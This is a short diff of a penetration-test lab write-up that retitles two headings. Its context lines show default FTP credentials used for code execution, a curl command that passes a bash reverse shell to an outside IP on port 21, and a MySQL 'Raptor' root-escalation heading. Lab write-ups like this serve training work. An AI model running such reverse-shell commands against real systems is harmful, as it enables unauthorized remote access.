@@ -19,7 +19,7 @@ PORT     STATE  SERVICE
 8295/tcp open   unknown
 ```
 
-### FTP Weak Creds --> RCE
+### FTP Weak Creds -> RCE
 
 The FTP service has weak credentials of `admin:admin`:
 
@@ -65,7 +65,7 @@ $ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.191/21 0
 
 ## Privilege Escalation
 
-### MySQL Raptor --> Root
+### MySQL Raptor -> Root
 
 Within the machine, we find that MySQL is listening on port 3306:
 
